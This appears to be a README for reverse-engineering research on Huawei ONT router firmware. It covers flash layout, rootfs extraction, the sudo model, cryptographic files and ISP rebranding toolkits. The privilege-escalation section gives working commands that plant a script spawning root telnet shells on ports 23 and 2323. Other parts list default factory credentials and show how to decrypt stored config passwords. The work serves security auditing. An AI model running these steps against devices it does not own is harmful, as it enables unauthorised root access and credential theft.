# Huawei ONT Firmware — Reverse Engineering Research

> **Scope:** Full firmware analysis of a Huawei ONT (Optical Network Terminal) router running **Dopra Linux / VRP V500R022C10**. This document covers filesystem extraction, privilege escalation, cryptographic material analysis, and the ONTS management toolkit.

---

## Table of Contents

- [Device Overview](#device-overview)
- [Firmware Identification](#firmware-identification)
- [Repository Structure](#repository-structure)
- [NAND Flash Layout](#nand-flash-layout)
- [Filesystem Extraction](#filesystem-extraction)
- [System Architecture](#system-architecture)
- [User & Permission Model](#user--permission-model)
- [Privilege Escalation — Root Access](#privilege-escalation--root-access)
- [Cryptographic Material (R021-KriptoMaden)](#cryptographic-material-r021-kriptomaden)
- [ONTS Toolkit Analysis](#onts-toolkit-analysis)
- [R23R24 Rebranding Toolkit](#r23r24-rebranding-toolkit)
- [Configuration & Password Cryptographic Tool](#configuration--password-cryptographic-tool)
- [HWNP Binary Format](#hwnp-binary-format)
- [OSBC Flash Protocol](#osbc-flash-protocol)
- [Network Services](#network-services)
- [Tools Used](#tools-used)
- [Key Findings Summary](#key-findings-summary)

---

## Device Overview

| Field | Value |
|-------|-------|
| **Manufacturer** | Huawei Technologies Co., Ltd. |
| **OS** | Dopra Linux (VRP platform) |
| **Kernel** | Linux 4.4.240 (gcc 7.3.0, Compiler CPU V200R006C10SPC010B002) |
| **Architecture** | ARM (MIPS for some subsystems) |
| **Flash Type** | SPI-NAND (hinand), 512 MB (`0x20000000`) |
| **RAM** | 494 MB (visible to Linux) |
| **Rootfs** | SquashFS (read-only) |
| **Persistent Storage** | JFFS2 at `/mnt/jffs2/` |
| **Boot ROM** | `bootcode` at MTD0 (2 MB) |
| **Bootloader** | U-Boot with A/B rotation |
| **Firmware Version (dump)** | V500R022C10 |
| **Firmware Version (live shell)** | V500R020C00SPC080B160 |
| **PON Support** | GPON + EPON (dual-mode) |

### Kernel Boot Arguments

```
noalign mem=494M flashsize=0x20000000 console=ttyAMA1,115200
root=/dev/mtdblock7 rootflags=image_off=0x28c094 rootfstype=squashfs
mtdparts=hinand:0x200000(bootcode)raw,0x1fe00000(ubilayer_v5)
ubi.mtd=1 maxcpus=2 l2_cache=l2x0 coherent_pool=4M
flash_control=fmc flash_chip=spinand
```

---

## Firmware Identification

Firmware images are signed with Huawei X.509 certificates:

```
Issuer:  Huawei Code Signing Certificate Authority
CA Root: Huawei Root CA (valid 2015–2025)
```

SHA-256 component hashes (R019 baseline):

| Component | SHA-256 |
|-----------|---------|
| kernel | `447ea445917ed0eb174aee478cd9bf99e10ca520d9e5f584f476dab503c7ba80` |
| uboot | `613b67fab10c0288fae9d364c4afec9d0f1c7dd92db5a30df893cdbc63e78ba7` |
| rootfs | `dca915a246ab58e2a9890f0cab8a7eebb42a37d264c9838e46b7a3ea5b3d16e4` |
| exrootfs | `a97b7253a9f99699b7c3cbb2185344f8b2af47a82bcc172b13cfa844d458079d` |

---

## Repository Structure

```
Firmware/
├── README.md                       # Main research overview (this file)
├── Root.md                         # Full live-shell research notes (2378 lines)
├── docs/                           # Detailed sub-reports & installation guides
│   ├── Crypto_Extraction_Report.md
│   ├── Final_Crypto_Analysis_Report.md
│   ├── busybox_usb_installation_guide.md
│   ├── complete_busybox_usb_guide.md
│   ├── crypto_reverse_engineering_report.md
│   ├── huaweiXML_CFG_Analysis_Report.md # Analysis of huaweiXML_CFG.exe config & password crypto
│   ├── huawei_xt26g04c_dump9_Analysis_Report.md # Analysis of XT26G04C NAND flash dump
│   ├── hw_ctree_2_Analysis_Report.md   # Analysis & Decryption of hw_ctree_2.xml configuration
│   ├── hw_flashcfg_Analysis_Report.md  # Analysis & Comparison of flash partition layouts
│   ├── hw_flashcfg_shaopian.xml        # Flash layout spec (Standard 2K page)
│   ├── hw_flashcfg_shaopian_4k.xml     # Flash layout spec (Modern 4K page)
│   ├── router_key_status.md
│   ├── router_web_interface_analysis.md
│   ├── verified_suser_passwords.md     # Summary of extracted & verified sUser passwords
│   └── web_interface_version_analysis.md
├── scripts/                        # Organized reverse engineering python/shell scripts
│   ├── extraction/                 # Flash dump scanning & SquashFS extraction scripts
│   ├── root_telnet/                # Privilege escalation & telnet access triggers
│   ├── crypto/                     # Key crack bruteforce, decompilation mock sources & hooks
│   │   ├── huawei_xml_cfg_tool.py  # Standalone python clone of huaweiXML_CFG.exe
│   │   └── ...
│   └── web/                        # Web interface session tools & brute-forcing
├── libs/                           # Shared object libraries extracted from firmware
│   ├── libc.so
│   ├── libhw_smp_capi.so
│   ├── libl3_base_api.so
│   ├── libmbedcrypto.so
│   └── libmbedtls.so
├── R021-KriptoMaden/               # Cryptographic material extracted from firmware
│   ├── dropbear_rsa_host_key       # Dropbear RSA host key (872 bytes)
│   ├── kmc_store_A                 # KMC encrypted store A (1698 bytes)
│   ├── kmc_store_B                 # KMC store B (redundant copy)
│   ├── servercert.pem              # Server certificate (binary blob, 2736 bytes)
│   ├── su_pub_key                  # Superuser public key (126 bytes)
│   ├── diagchar.ko                 # Diagnostic char device kernel module
│   ├── ftm                         # Factory Test Mode binary (ARM ELF)
│   ├── hw_boardinfo                # Board identity (KM-magic prefix)
│   └── weakpwdlist.cfg             # Weak password blocklist (4104 bytes)
├── ONTS/                           # ONT provisioning & firmware flashing toolkit
│   ├── R019_allShell.bin           # R019 all-section shell bundle
│   ├── allshell2.bin               # Minimal shell bundle (product 734)
│   ├── allshell4.bin               # Extended ARM ELF + flash layout XML
│   ├── allshell/
│   │   ├── r017.bin                # R017 shell patch
│   │   ├── r019.bin                # R019 shell patch (Huawei-signed)
│   │   └── r020.bin                # R020 shell patch
│   ├── R22/
│   │   └── R22开telnet.bin         # Full firmware → enables Telnet (1.8 MB)
│   ├── R23/
│   │   ├── ONT_V100R002C00SPC253.exe
│   │   ├── r23补全包.bin           # R23 completion bundle (115 KB)
│   │   ├── 刷公版命令改3码命令.pdf  # Flash + recode 3 IDs guide (Chinese)
│   │   └── log/                    # OSBCToolClient operation logs
│   └── Tool/
│       ├── HW Dollar2.exe
│       ├── ONT-V3-V5.exe
│       ├── huawei.exe
│       ├── putty.exe
│       ├── tftpd64.exe
│       ├── hwmtd.zip
│       └── shell/                  # R22/R24 firmware shell payloads
├── R23R24/                         # China Unicom ISP rebranding & provisioning toolkit
│   ├── HS8545M5_V500R020C00SPC200B459.bin  # Full HWNP firmware (54 MB)
│   ├── R24补全包.bin               # R24 completion bundle (TelnetEnable + EquipMode)
│   ├── shell9.bin                  # R019 HWNP shell patch
│   ├── unicom.tar.gz               # China Unicom province configs (30+ provinces)
│   ├── customizepara.txt           # Board identity 3-code parameters
│   ├── 必看步骤.jpg                # Visual step-by-step guide (Chinese)
│   ├── 一键操作.bat                # One-click TFTP + boardinfo replace + reboot
│   ├── 一键打开装备模式*.bat       # Enable Equipment Mode (2 IP variants)
│   ├── 一键关闭装备模式.bat        # Disable Equipment Mode + reboot
│   ├── 开启电脑telnet.bat          # Enable Windows Telnet/TFTP + aux IP setup
│   ├── ONT_V100R002C00SPC253.exe   # ONT management GUI
│   ├── HW Dollar2.exe              # hw_boardinfo identity editor (.NET)
│   ├── tftpd32.exe                 # TFTP server (32-bit)
│   └── 华为配置加解密工具.exe      # Config encrypt/decrypt tool (UPX packed)
├── rootfs.squashfs                 # Primary rootfs image (81 MB, Git LFS)
├── rootfs2.squashfs                # Secondary rootfs image (42 MB, Git LFS)
├── 20260518_140638_TC58CVG2S0HRA.bin # Full NAND dump (512 MB, excluded)
├── huawei_xt26g04c_dump9.bin       # Raw XT26G04C NAND flash dump (512 MB, Git LFS)
├── hw_ctree.xml                    # Decrypted XML configuration tree (198 KB)
├── hw_ctree.xml.enc                # Encrypted XML configuration tree (33 KB)
├── hw_ctree_2.xml                  # Second decrypted XML configuration tree (198 KB)
└── TC58CVG2S0HRAIG.PDF             # NAND flash chip datasheet
```

---

## NAND Flash Layout

Details on the raw XML partition definitions and boundaries for standard vs. 4K page layouts can be found in the [Flash Configuration Analysis Report](file:///home/recep/Masaüstü/Firmware/docs/hw_flashcfg_Analysis_Report.md).

### 1. SPI-NAND: TC58CVG2S0HRA — 512 MB total

```
SPI-NAND: TC58CVG2S0HRA — 512 MB total
┌─────────────────┬────────────┬────────────┬──────────────────────────┐
│ Partition       │ Start      │ Size       │ Contents                 │
├─────────────────┼────────────┼────────────┼──────────────────────────┤
│ bootcode (raw)  │ 0x00000000 │ 0x00200000 │ Boot ROM (2 MB)          │
│ ubilayer_v5     │ 0x00200000 │ 0x1FE00000 │ UBI container (510 MB)   │
└─────────────────┴────────────┴────────────┴──────────────────────────┘
```

### 2. SPI-NAND: XT26G04C — 512 MB total

```
SPI-NAND: XT26G04C — 512 MB total (from `huawei_xt26g04c_dump9.bin`)
┌─────────────────┬────────────┬────────────┬──────────────────────────┐
│ Partition       │ Start      │ Size       │ Contents                 │
├─────────────────┼────────────┼────────────┼──────────────────────────┤
│ startcode (raw) │ 0x00000000 │ 0x00200000 │ Startcode (2 MB)         │
│ ubifs           │ 0x00200000 │ 0x1FE00000 │ UBI container (510 MB)   │
└─────────────────┴────────────┴────────────┴──────────────────────────┘
```

**UBI Volumes inside `ubilayer_v5`:**

| Volume | Contents |
|--------|----------|
| vol_0 | U-Boot (copy A) |
| vol_1 | U-Boot (copy B) |
| vol_2 | Kernel (copy A) |
| vol_3 | Kernel (copy B) |
| vol_4 | **SquashFS rootfs (primary)** ← extraction target |
| vol_5 | SquashFS rootfs (copy B) |
| vol_6 | JFFS2 filesystem (`/mnt/jffs2/`) |
| vol_7 | Flash config (A/B) |

**Flash layout per embedded XML spec (128 MB NAND variant):**

```
startcode      0x00020000  (128 KB)
uboot     A/B  0x00080000  (512 KB each)
flash_cfg A/B  0x00020000  (128 KB each)
kernel    A/B  0x00300000  (3 MB each)
rootfs    A/B  0x01C00000  (28 MB each)   [256 MB variant: 40 MB each]
wifi_param     0x00020000  (128 KB)
system_param   0x00020000  (128 KB)
file_system    0x01400000  (20 MB)
```

---

## Filesystem Extraction

**Tools used:** `sasquatch` (handles Huawei LZMA variant), custom Python scripts

```bash
# Locate SquashFS signatures in NAND dump
python3 scripts/extraction/find_hsqs_vol4.py

# Extract primary rootfs (Huawei-variant SquashFS)
sasquatch -p 1 -le -dest rootfs_extract/ volume_4_squashfs.bin

# Extract secondary rootfs
sasquatch -p 1 -le -dest rootfs_extract2/ volume_5_squashfs.bin
```

Key filesystem paths:

```
/bin/                            — System binaries (BusyBox + Huawei custom)
/etc/rc.d/rc.start/
    0.wap_init.sh                — WAP platform initialization
    1.sdk_init.sh                — SDK init (calls audit framework)
/etc/wap/customize/china/        — ISP customization (CMCC, Unicom, CNC, etc.)
/mnt/jffs2/                      — Writable JFFS2 (survives reboot)
    Install_gram/                — Audit agent dir ← exploit write target
    hw_ctree.xml                 — Main configuration tree
    kmc_store_A / kmc_store_B    — KMC cryptographic stores
    hw_boardinfo                 — Encrypted board identity
```

---

## System Architecture

### Boot Chain

```
Power-On
    │
    ▼
bootcode (MTD0, 2 MB raw)
    │
    ▼
U-Boot (A/B rotation)
    │
    ▼
Linux 4.4.240 (ARM SMP, 2 cores)
    │
    ▼
init (PID 1)
    ├─► 0.wap_init.sh      — Platform init
    └─► 1.sdk_init.sh      — SDK init
              │
              └─► ssmp (srv_ssmp)
                      │
                      └─► AUDIT_StartOnBoot()
                                │
                                └── if /mnt/jffs2/Install_gram/control_audit.sh exists:
                                        cd /mnt/jffs2/Install_gram
                                        ./control_audit.sh --start
```

### Key Binaries

| Binary | Function |
|--------|----------|
| `/bin/ssmp` | SSMP daemon — calls `control_audit.sh` |
| `/bin/audit` | Audit downloader — fetches and runs `control_audit.sh` |
| `/bin/qoe` | QoE monitoring — also invokes `control_audit.sh` |
| `/bin/hw_restore_manufactory_exec.sh` | Factory restore (runs as **root** via sudo) |
| `/bin/restorehwmode.sh` | Hardware mode restore (runs as **root** via sudo) |
| `/bin/keyfilemng` | Key file management |

---

## User & Permission Model

### `/etc/passwd` (excerpt)

```
root:*:0:0:root:/root:/sbin/nologin        ← interactive login disabled
srv_ssmp:x:3008:2002:hw_srv_ssmp:...:/bin/false
srv_clid:x:3030:2002:hw_srv_clid:...:/bin/false   ← write access to /mnt/jffs2/
srv_kmc:x:3020:500:hw_srv_kmc:...:/bin/false      ← owns kmc_store files
```

> No `/etc/shadow` exists — password auth uses a Huawei-proprietary mechanism.

### sudo Rules (security-relevant)

```sudoers
# Factory restore — no password, runs as root
(root) NOPASSWD: /bin/hw_restore_manufactory_exec.sh, /bin/restorehwmode.sh

# Key management
(root) NOPASSWD: /bin/keyfilemng save, /bin/keyfilemng check

# Reboot + customization
(root) NOPASSWD: /sbin/reboot, /bin/customize_del_file.sh, /bin/create_factory_file.sh

# Environment-preserving (injection vector)
(root) SETENV: NOPASSWD: /bin/ubus, /usr/sbin/saf-huawei
```

---

## Privilege Escalation — Root Access

### Vulnerability Chain

```
[srv_clid user]
    │
    │  write to /mnt/jffs2/ (writable by srv_clid, gid 2002)
    ▼
/mnt/jffs2/Install_gram/control_audit.sh  ← attacker-controlled script
    │
    │  called by hw_restore_manufactory_exec.sh (via sudo, as root)
    ▼
[root code execution]
```

### Steps

**1. Create directory and plant payload:**

```sh
mkdir -p /mnt/jffs2/Install_gram
chmod 755 /mnt/jffs2/Install_gram

cat > /mnt/jffs2/Install_gram/control_audit.sh << 'EOF'
#!/bin/sh
LOG="/tmp/payload.log"
echo "$(date) control_audit $1" >> $LOG

case "$1" in
  --stop)
    killall -q telnetd 2>/dev/null
    ;;
  *)
    telnetd -l /bin/sh -p 2323 2>/dev/null &
    telnetd -l /bin/sh -p 23 2>/dev/null &
    echo "$(date) telnetd started" >> $LOG
    ;;
esac
EOF

chmod 755 /mnt/jffs2/Install_gram/control_audit.sh
```

**2. Trigger as root:**

```sh
sudo /bin/hw_restore_manufactory_exec.sh &
```

**3. Connect:**

```sh
telnet 192.168.1.1 2323
# → uid=0(root) shell
```

### Confirmed Live Execution

```
WAP(Dopra Linux) # chmod 755 /mnt/jffs2/Install_gram
WAP(Dopra Linux) # /mnt/jffs2/Install_gram/control_audit.sh --start
WAP(Dopra Linux) # cat /tmp/payload.log
Thu Jan  1 01:51:59 UTC 1981 control_audit --start
Thu Jan  1 01:51:59 UTC 1981 telnetd started

WAP(Dopra Linux) # netstat -tlnp
Proto  Local Address       State
tcp    127.0.0.1:2323      LISTEN   ← shell listener active
tcp    192.168.1.1:22      LISTEN
tcp    192.168.1.1:443     LISTEN
```

### All Binaries That Call `control_audit.sh`

| Binary | Call |
|--------|------|
| `/bin/audit` | `cd /mnt/jffs2/Install_gram; ./control_audit.sh --start` |
| `/bin/ssmp` | `/mnt/jffs2/Install_gram/control_audit.sh` |
| `/bin/qoe` | `cd /mnt/jffs2/Install_gram; ./control_audit.sh --start` |
| `/bin/hw_restore_manufactory_exec.sh` | `control_audit.sh --stop` (as root) |
| `/bin/restorehwmode.sh` | `control_audit.sh --stop` (as root) |

---

## Cryptographic Material (R021-KriptoMaden)

### File Inventory

| File | Size | Description |
|------|------|-------------|
| `dropbear_rsa_host_key` | 872 B | SSH RSA host private key (Huawei-wrapped) |
| `kmc_store_A` | 1698 B | KMC encrypted store (hardware-backed) |
| `kmc_store_B` | 1698 B | KMC store B (redundant copy) |
| `servercert.pem` | 2736 B | Binary blob (not standard PEM/DER) |
| `su_pub_key` | 126 B | Superuser RSA public key |
| `diagchar.ko` | 89503 B | KMC interface kernel module |
| `ftm` | 18590 B | Factory Test Mode binary |
| `hw_boardinfo` | 210 B | Board identity (KM-magic prefix) |
| `weakpwdlist.cfg` | 4104 B | Password blocklist |

### KMC Architecture

```
kmc_store_A/B
     │
     ▼
srv_kmc (uid 3020, gid kmc)
     │
     ▼
/dev/diagchar  ← diagchar.ko
     │
     ▼
KMC hardware chip (decryption oracle)
```

Keys are hardware-protected. Software extraction without the physical chip is not feasible.

### Dropbear Key Status

The `dropbear_rsa_host_key` does **not** use standard Dropbear 0.53+ format:

```
Hex: 6803 0000 0000 0000 0100 0000 8338 f053 ...
```

`dropbearconvert` returns `"Exited: String too long"` — the key is wrapped in a Huawei proprietary container before storage.

---

## ONTS Toolkit Analysis

### HWNP Shell Payload Binaries

| File | Target Path | Purpose |
|------|-------------|---------|
| `R019_allShell.bin` | `/mnt/jffs2/TelnetEnable` | Enable Telnet on R019 |
| `allshell/r017.bin` | `/mnt/jffs2/hw_hardinfo_feature` | Patch feature flags |
| `allshell/r019.bin` | `/mnt/jffs2/hw_hardinfo_feature` | R019 signed feature patch |
| `R22/R22开telnet.bin` | Full firmware image | **Open Telnet** on R22 hardware |
| `R23/r23补全包.bin` | Partial image | R23 completion bundle |
| `Tool/shell/R24_zhuangbei_gaihuawei.bin` | Partial image | R24 equipment + rebrand to Huawei |

### Product ID Coverage by Version

| Version | Compatible Product IDs |
|---------|----------------------|
| R017 | 767, 323, 353, 343, 393, 373, 3A3, 3E3, 3C3, 333, 734, 627, 1029, 377, 397, 1007, 1027, 1067, 10F7, 10C7, B79, BB9 |
| R019 | 148C, 15BD, 15FE |
| R023+ | 50+ product IDs including 131–B17, 734, 1029 |

### Operation Logs — Real Device Sessions

```
Device:     028HHFHYM4004155  (MAC: 482C-D05F-1EA3)  — 2026-05-16
Operations: OpenTelnet ×10, UpgradeBin ×12

Device:     AG24B1552398  (MAC: 00E0-FC55-2398)  — 2025-12-14
Operations: UpgradeBin ×1, CloseTelnet ×6
```

---

## R23R24 Rebranding Toolkit

The `R23R24/` folder contains a **complete China Unicom ISP rebranding and provisioning toolkit** for Huawei ONT devices running firmware versions R023–R024.

### HWNP Payloads

| File | Version | Target Products | Flash Targets | Purpose |
|------|---------|----------------|---------------|---------|
| `HS8545M5_V500R020C00SPC200B459.bin` | V500R020C00SPC200B459 | `147C\|149C\|14ED\|14FD` + CMCC | `flash:uboot`, `flash:kernel`, `flash:rootfs` + plugins | Full firmware image for HS8545M5 (54 MB) |
| `R24补全包.bin` | R024 | 30+ product IDs (`120\|130\|140\|...\|431`) | `file:/mnt/jffs2/TelnetEnable`, `file:/mnt/jffs2/equipment.tar.gz` | Enable Telnet + Equipment Mode |
| `shell9.bin` | V500R019C20SPC105B120 | `147C\|148C\|14ED\|15BD\|182F` | `file:/var/signature` | Shell patch — writes `hw_hardinfo_feature` to enable CLI China mode |

### China Unicom Province Customization (`unicom.tar.gz`)

Contains ISP-specific default configuration for **all Chinese provinces** under China Unicom (联通):

```
unicom.tar.gz/
├── choose/               # Operator selection XML
├── customize/            # 30+ province-specific configs with CRC checksums
│   ├── hw_default_bjunicom.xml   (Beijing)
│   ├── hw_default_shcu.xml       (Shanghai)
│   ├── hw_default_gdcu.xml       (Guangdong)
│   └── ... (all provinces)
├── hw_boardinfo          # Pre-configured board identity
└── hw_default_ctree.xml  # Default configuration tree
```

### Automation Batch Scripts

| Script | Purpose |
|--------|---------|
| `开启电脑telnet.bat` | Enables Windows Telnet/TFTP clients, adds auxiliary IP `192.168.100.2/24` |
| `一键打开装备模式192.168.1.1.bat` | Telnet → `root`/`Admin123` → `su` → `EquipMode.sh on` → `reset` |
| `一键打开装备模式192.168.100.1.bat` | Telnet → `root`/`admin` → `su` → `EquipMode.sh on` → `reset` |
| `一键关闭装备模式.bat` | Telnet → `root`/`admin` → `EquipMode.sh off` → `reboot` |
| `一键操作.bat` | Full one-click: TFTP backup `hw_boardinfo` → upload `unicom.tar.gz` → extract → reboot |

### Board Identity Config (`customizepara.txt`)

```
01FFFFFFFF023FFF19HWTC920A40B47E bn5m4uzz  CU_Aq9b bn5m4uzz  CU_Aq9b-5G bn5m4uzz
```

Fields: LOID prefix, hardware serial mask, default WiFi password, SSID prefix (`CU_xxx`), 5G SSID suffix.

### Windows Tools

| Tool | Purpose |
|------|---------|
| `HW Dollar2.exe` | `.NET` GUI editor for `hw_boardinfo` — modifies device identity fields (obj.id values) |
| `ONT_V100R002C00SPC253.exe` | ONT management GUI (firmware flashing, Telnet toggle) |
| `tftpd32.exe` | TFTP server for file transfer between PC and router |
| `华为配置加解密工具.exe` | Huawei configuration file encrypt/decrypt utility (UPX packed) |

### Default Credentials

| Context | Username | Password |
|---------|----------|----------|
| Equipment mode (`192.168.100.1`) | `root` | `admin` |
| Equipment mode (`192.168.1.1`) | `root` | `Admin123` |
| Post-rebrand Unicom login | `CUAdmin` | `CUAdmin` |

---

## Configuration & Password Cryptographic Tool

The file `R23R24/华为配置加解密工具.exe` (unpacked as `huaweiXML_CFG.exe`) is used to encrypt and decrypt Huawei configuration files (`.enc`, `.cfg`, `hw_ctree.xml`) and decrypt stored password hashes. 

To run these operations offline without executing untrusted Windows binaries, we developed a pure-Python 3 clone utility: [huawei_xml_cfg_tool.py](file:///home/recep/Masaüstü/Firmware/scripts/crypto/huawei_xml_cfg_tool.py).

For a detailed analysis of the underlying cryptographic layout, dynamic key derivation, custom CRC-32 table, and base-93 encoding algorithms, see the full [Huawei ONT Config Cryptography Analysis Report](file:///home/recep/Masaüstü/Firmware/docs/huaweiXML_CFG_Analysis_Report.md).

### Python Tool Usage

#### 1. Configuration Decryption
Decrypts an encrypted `.enc` or `.cfg` configuration file to readable XML:
```bash
python3 scripts/crypto/huawei_xml_cfg_tool.py decrypt-cfg hw_ctree.xml.enc decrypted_cfg.xml
```

#### 2. Configuration Encryption
Re-encrypts a modified XML configuration file into a valid encrypted `.enc` file (including GZIP compression, custom chunked CRC-32 calculation, and HMAC-SHA256 signature):
```bash
python3 scripts/crypto/huawei_xml_cfg_tool.py encrypt-cfg modified_cfg.xml output_ctree.xml.enc
```

#### 3. Password Decryption
Auto-detects and decrypts stored configuration passwords, Wi-Fi keys, and tokens (Modes 1, 2, and 3):
```bash
# Decrypt a WLAN WPS DevicePassword (Mode 2)
python3 scripts/crypto/huawei_xml_cfg_tool.py decrypt-pwd '$2,t}i4H/rN%*Ad^@>a#Y7n*ioL)}/a=kb7m$-K8SF$'

# Decrypt a CLI superuser password (Mode 2)
python3 scripts/crypto/huawei_xml_cfg_tool.py decrypt-pwd '$2E\c^%:rrwHfV*nC|:4-NV|#LA*#@=I@r.V(IQ-lP$'
```

---

## HWNP Binary Format

```
Offset   Size   Field
0x00      4     Magic: "HWNP"
0x06      2     CRC / package length
0x08      8     Timestamp / serial
0x18      4     Header version (0x01)
0x20    ~192    Product ID list (pipe-separated, null-padded)
                Example: "148C|15BD|15FE|;E8C|COMMON|CHINA|CMCC|"
0x130     4     Payload data length
0x134    ~48    Target URI on device
                Example: "file:/mnt/jffs2/TelnetEnable"
0x230    ~16    Section name tag
                Example: "UPGRDCHECK", "SIGNINFO", "UNKNOWN"
[data]          Payload (XML, binary, or signed firmware blob)
[sig]           Huawei X.509 PKCS#7 signature
```

---

## OSBC Flash Protocol

```
Protocol:       ONT_21_PKG
Packet size:    252 bytes (fixed)
Frame size:     1200 bytes
Frame interval: 10 ms
Transport:      UDP unicast

Server IP:  192.168.1.20 / 192.168.100.22  (management PC)
Device IP:  99.0.0.224                      (ONT)

MsgType 0 → [start]  device returns OBSCResult 0x0
MsgType 2 → [end]    device returns flash result

Result codes:
  0x00000000  — Handshake accepted / flash complete
  0xf720404e  — Authenticated flash success (OBSC challenge passed)
```

| UpgradeType | Description |
|-------------|-------------|
| `OpenTelnet` | Flash to enable Telnet |
| `CloseTelnet` | Flash to disable Telnet |
| `UpgradeBin` | Flash full/partial firmware |

---

## Network Services

| Port | Protocol | Service |
|------|----------|---------|
| 22 | TCP | SSH (Dropbear) |
| 23 | TCP | Telnet (when enabled by HWNP payload) |
| 53 | TCP/UDP | DNS |
| 80 | TCP | HTTP web interface |
| 443 | TCP | HTTPS web interface |
| 2323 | TCP | Payload shell (when exploit active) |
| 37225 | TCP | Internal IPC (loopback) |
| 37443/37444 | TCP | Internal management |
| 49652–49653 | TCP | TR-069/CWMP |

---

## Tools Used

### Extraction & Static Analysis

| Tool | Purpose |
|------|---------|
| `sasquatch` | SquashFS extraction (Huawei LZMA variant) |
| `binwalk` | Firmware signature scanning |
| `xxd` | Hex inspection |
| `strings` | ASCII string extraction |
| `file` | File type identification |
| Python 3 | Custom scripts for NAND offset discovery |

### Cryptographic

| Tool | Purpose |
|------|---------|
| `dropbearconvert` | Dropbear ↔ OpenSSH key conversion (built from source) |
| `dropbearkey -y` | Extract public key from Dropbear key |
| `openssl` | Certificate/DER inspection |

### Network & Live Access

| Tool | Purpose |
|------|---------|
| PuTTY | Serial / Telnet / SSH |
| tftpd64 | TFTP server for device file transfer |
| netcat | Shell relay |
| telnet | Connect to payload shells |

### Huawei-Specific (Windows)

| Tool | Purpose |
|------|---------|
| `ONT_V100R002C00SPC253.exe` | ONT management GUI |
| `ONT-V3-V5.exe` | ONT V3–V5 management |
| `huawei.exe` | General-purpose ONT flash tool |
| `OSBCToolClient` | Batch ONT OBSC flash client |
| `hwmtd.zip` | MTD partition flash helper |

---

## Key Findings Summary

| # | Finding | Severity |
|---|---------|----------|
| 1 | **Root shell via `control_audit.sh`** — any process writing to `/mnt/jffs2/` can plant a script executed as root through `sudo hw_restore_manufactory_exec.sh` | **Critical** |
| 2 | **Telnet enable via HWNP flash** — flashing a `TelnetEnable` payload opens unauthenticated Telnet on port 23 | **High** |
| 3 | **MTD devices accessible to `disk` group** — raw NAND read/write possible from userspace | **High** |
| 4 | **`sudo SETENV` with `ubus`** — environment injection vector for privilege escalation | **Medium** |
| 5 | **No `/etc/shadow`** — password mechanism is non-standard and proprietary | **Medium** |
| 6 | **OBSC result `0xf720404e` is static per-device** — authentication challenge/response is predictable | **Medium** |
| 7 | **KMC hardware-backed encryption** — cryptographic keys protected by dedicated chip; software extraction not feasible without hardware | Informational |
| 8 | **SquashFS rootfs is read-only** — all persistence must go through JFFS2 | Informational |
| 9 | **Equipment Mode default credentials `root`/`admin`** — batch scripts automate Telnet login with well-known factory passwords | **High** |
| 10 | **ISP rebranding toolkit** — `R23R24/` contains a complete one-click workflow to rebrand ONT identity (hw_boardinfo), flash custom firmware, and overlay China Unicom province configs | **Medium** |
| 11 | **Config encrypt/decrypt tool** — `华为配置加解密工具.exe` can decrypt Huawei configuration files, exposing all device settings | **Medium** |

---

*Research conducted for educational and security audit purposes on owned hardware.*
